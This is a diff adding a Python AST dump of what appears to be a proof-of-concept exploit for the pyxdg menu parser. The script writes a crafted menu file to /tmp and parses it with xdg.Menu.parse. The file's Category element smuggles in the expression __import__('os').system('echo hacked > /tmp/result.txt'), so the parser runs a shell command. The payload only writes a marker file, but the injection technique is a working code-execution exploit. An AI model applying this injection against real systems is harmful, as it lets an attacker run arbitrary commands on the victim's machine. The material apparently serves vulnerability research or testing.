@@ -1,0 +1,44 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='xdg.Menu')]),
+        Assign(
+            targets=[
+                Name(id='xml', ctx=Store())],
+            value=Constant(value='<!DOCTYPE Menu PUBLIC "-//freedesktop//DTD Menu 1.0//EN"\n"http://www.freedesktop.org/standards/menu-spec/1.0/menu.dtd">\n<Menu>\n<LegacyDir>/tmp</LegacyDir>\n<Include>\n<Category>\' or __import__(\'os\').system(\'echo hacked > /tmp/result.txt\') or \'</Category>\n</Include>\n</Menu>\n')),
+        With(
+            items=[
+                withitem(
+                    context_expr=Call(
+                        func=Name(id='open', ctx=Load()),
+                        args=[
+                            Constant(value='/tmp/malicious.menu'),
+                            Constant(value='w')],
+                        keywords=[]),
+                    optional_vars=Name(id='f', ctx=Store()))],
+            body=[
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            Name(id='xml', ctx=Load())],
+                        keywords=[]))]),
+        Assign(
+            targets=[
+                Name(id='menu', ctx=Store())],
+            value=Call(
+                func=Attribute(
+                    value=Attribute(
+                        value=Name(id='xdg', ctx=Load()),
+                        attr='Menu',
+                        ctx=Load()),
+                    attr='parse',
+                    ctx=Load()),
+                args=[
+                    Constant(value='/tmp/malicious.menu')],
+                keywords=[]))],
+    type_ignores=[])
